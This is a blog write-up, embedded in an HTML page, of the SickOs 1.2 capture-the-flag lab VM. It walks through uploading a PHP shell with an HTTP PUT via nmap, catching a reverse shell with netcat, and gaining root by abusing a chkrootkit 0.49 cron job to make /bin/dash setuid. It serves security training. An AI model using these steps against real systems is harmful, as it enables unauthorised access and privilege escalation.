@@ -1,0 +1,580 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>SickOs 1.2 writeup - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="SickOs 1.2 writeup">
+  <meta name="keywords" content="sickos 1.2, sickos 1.2 walkthrough, sickos 1.2, sickos 1.2 solution, sickos 1.2 writeup, sickos vulnhub">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">SickOs 1.2 writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-07-03T04:20:13-04:00" pubdate data-updated="true">Jul 3<span>rd</span>, 2017</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Today&rsquo;s VM is the second machine in the SickOs series. The goal is to obtain the root flag. Target acquired!</p>
+
+<!-- more -->
+
+
+<p></p>
+
+<p>I did a fast scan with Masscan and discovered that ports 22 and 80 are open. Then I scanned them with Nmap:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -p22,80 -sV 192.168.217.146
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-03 09:11 EDT
+</span><span class='line'>Nmap scan report for 192.168.217.146
+</span><span class='line'>Host is up (0.00030s latency).
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>80/tcp open  http    lighttpd 1.4.28</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The web server serves this pic:</p>
+
+<p><img class="center" src="/images/pentest/sickos/2-blow.jpg" title="web server" alt="webpage"></p>
+
+<p>Nothing in exiftool. I bruteforced the web server, but the only discovery was an empty test directory. I initially overlooked the page source of the picture, until I noticed there is a scroll bar. So I scrolled down to find a comment:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- NOTHING IN HERE ///\\\ --&gt;&gt;&gt;&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I tried constructing a path out of the comment, but didn&rsquo;t get anywhere. Searching for an exploit for the lighttpd server version didn&rsquo;t yield anything either, although I found some for other versions.</p>
+
+<p>Back to the empty directory, I found it strange that there would be an innocuous empty folder on the web server, and I thought it might hint to making it..not empty by uploading something there :&ndash;) I was at a loss on how to do that with no attack vectors, but then I remembered that uploading something on a server doesn&rsquo;t always require sophisticated mechanisms and PHP vulnerabilities and the like. It&rsquo;s just as simple as using a certain HTTP method that you don&rsquo;t see too often: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT">PUT</a></p>
+
+<p>First, I needed to verify if PUT is allowed in the first place:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.217.146
+</span><span class='line'>PORT   STATE SERVICE
+</span><span class='line'>80/tcp open  http
+</span><span class='line'>| http-methods: 
+</span><span class='line'>|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
+</span><span class='line'>|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
+</span><span class='line'>|_  Path tested: /test</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Excellent! I proceeded to upload a PHP shell with curl,but I got some weird expectation failed errors. Luckily, Nmap also has a script for PUT&#8217;ing things on a server:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 80 192.168.217.146 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='/root/Desktop/shell.php'
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-04 04:36 EDT
+</span><span class='line'>Nmap scan report for 192.168.217.146
+</span><span class='line'>Host is up (0.00031s latency).
+</span><span class='line'>PORT   STATE SERVICE
+</span><span class='line'>80/tcp open  http
+</span><span class='line'>|_http-put: /test/shell.php was successfully created</span></code></pre></td></tr></table></div></figure>
+
+
+<p>All didn&rsquo;t work well, though. I usually use 8888 for my reverse shells, but this time I got nothing. I tried port 80, and still no joy. It seems that only port 443 is allowed. I looked at other walkthroughs for this, so I&rsquo;m not sure how you could determine it otherwise besides trial and error. But when I changed to the correct port, I got the shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 443
+</span><span class='line'>listening on [any] 443 ...
+</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.146] 49769
+</span><span class='line'>Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
+</span><span class='line'> 01:48:24 up  1:38,  0 users,  load average: 0.00, 0.01, 0.05
+</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
+</span><span class='line'>$ whoami
+</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, I did some enumeration. The usual culprits didn&rsquo;t stand out, and the permissions on this shell were pretty limited, but I did find something interesting pertaining to cron:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls -al /etc/cron*
+</span><span class='line'>-rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab
+</span><span class='line'>
+</span><span class='line'>ls: cannot open directory /etc/cron.d: Permission denied
+</span><span class='line'>/etc/cron.daily:
+</span><span class='line'>total 72
+</span><span class='line'>drwxr-xr-x  2 root root  4096 Apr 12  2016 .
+</span><span class='line'>drwxr-xr-x 84 root root  4096 Jul  4 00:10 ..
+</span><span class='line'>-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
+</span><span class='line'>-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
+</span><span class='line'>-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
+</span><span class='line'>-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
+</span><span class='line'>-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
+</span><span class='line'>-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
+</span><span class='line'>-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
+</span><span class='line'>-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
+</span><span class='line'>-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
+</span><span class='line'>-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
+</span><span class='line'>-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
+</span><span class='line'>-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
+</span><span class='line'>-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The entry that got my attention was the chkrootkit one. chkrootkit is a tool that checks for rootkits on the system. I googled for possible exploits, and I did find <a href="https://www.exploit-db.com/exploits/33899/">one</a> right away. The vulnerable version is 0.49. I checked which version is installed on the system:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ chkrootkit -V
+</span><span class='line'>chkrootkit version 0.49</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well, well! The exploit leverages exactly the case here, vulnerable chkrootkit running as root, courtesy of the cron job. The step to compromise the system is to put an executable file named &lsquo;update&rsquo; with non-root owner in /tmp</p>
+
+<p>So, my idea was to give myself privileges to run an existing shell as root. I looked at what shells are installed on the system:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /etc/shells
+</span><span class='line'># /etc/shells: valid login shells
+</span><span class='line'>/bin/sh
+</span><span class='line'>/bin/dash
+</span><span class='line'>/bin/bash
+</span><span class='line'>/bin/rbash
+</span><span class='line'>$ ls -l /bin/*sh
+</span><span class='line'>-rwxr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash
+</span><span class='line'>-rwxr-xr-x 1 root root 100284 Mar 29  2012 /bin/dash
+</span><span class='line'>lrwxrwxrwx 1 root root      4 Mar 28  2013 /bin/rbash -&gt; bash
+</span><span class='line'>lrwxrwxrwx 1 root root      4 Mar 29  2012 /bin/sh -&gt; dash
+</span><span class='line'>lrwxrwxrwx 1 root root      7 Nov 16  2012 /bin/static-sh -&gt; busybox</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I wasted almost an hour next, because the non-interactive shell gave me grief and prevented things from working properly. I started with bash and made it suid and ran it, but it didn&rsquo;t work. What worked was making dash suid and also spawning a TTY shell with <code>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;</code>.</p>
+
+<p>Inside the update file, I just made <em>/bin/dash</em> suid:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat update
+</span><span class='line'>#!/bin/bash
+</span><span class='line'>chmod u+s /bin/dash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I waited a minute for cron to run and got root:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ /bin/dash
+</span><span class='line'>/bin/dash
+</span><span class='line'># whoami
+</span><span class='line'>whoami
+</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Besides the flag, in the root directory there was rule file for iptables that explained the VM&rsquo;s behavior. Anyway, here&rsquo;s the flag:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+</span><span class='line'>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+</span><span class='line'>WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.
+</span><span class='line'>
+</span><span class='line'>Thanks for giving this try.
+</span><span class='line'>
+</span><span class='line'>@vulnhub: Thanks for hosting this UP!.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This machine was challenging in the way it limited you to only certain actions. Damn, the first thing I will do from now on when getting a limited shell is spawn a TTY!!!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
+</span><span class='line'>/ Tomorrow will be cancelled due to lack \
+</span><span class='line'>\ of interest.                           /
+</span><span class='line'> ----------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-07-03T04:20:13-04:00" pubdate data-updated="true">Jul 3<span>rd</span>, 2017</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2017/07/02/theharvester-kali-linux-tools/" title="Previous Post: TheHarvester - Kali Linux tools">&laquo; TheHarvester - Kali Linux tools</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2017/07/03/sickos-1-dot-2-writeup/">SickOs 1.2 writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/07/02/theharvester-kali-linux-tools/">TheHarvester - Kali Linux tools</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/07/01/owning-mr-robot/">Owning Mr Robot</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/06/30/wafw00f-kali-linux-tools/">wafw00f - Kali Linux tools</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/06/28/sickos-1-dot-1-writeup/">SickOs 1.1 writeup</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2017 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup/';
+        var disqus_url = 'http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
